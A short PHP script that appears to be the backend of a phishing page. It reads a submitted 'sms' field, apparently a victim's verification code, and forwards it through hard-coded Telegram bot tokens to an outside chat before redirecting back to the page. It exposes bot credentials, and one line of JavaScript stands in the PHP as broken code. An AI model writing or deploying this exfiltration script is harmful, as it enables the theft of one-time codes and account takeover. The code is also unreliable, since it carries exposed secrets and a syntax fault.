<?php


// https://api.telegram.org/bot5389899824:AAGkJHLwTgMf2qPTIlKbjfQ4u28XPwiDtbw/getUpdates

$sms = $_POST['sms'];
$token = "5314142201:AAHzAGE3S3dQ1zCQlseWjIUO3U8WVvQ02A8";
$chat_id = '-610084593';
$arr = array(
    'sms: ' => $sms,
);

foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b>".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if($sendToTelegram) {
    header('Location: index.html');
    form.reset();
} else {
    echo "Error";
}
?>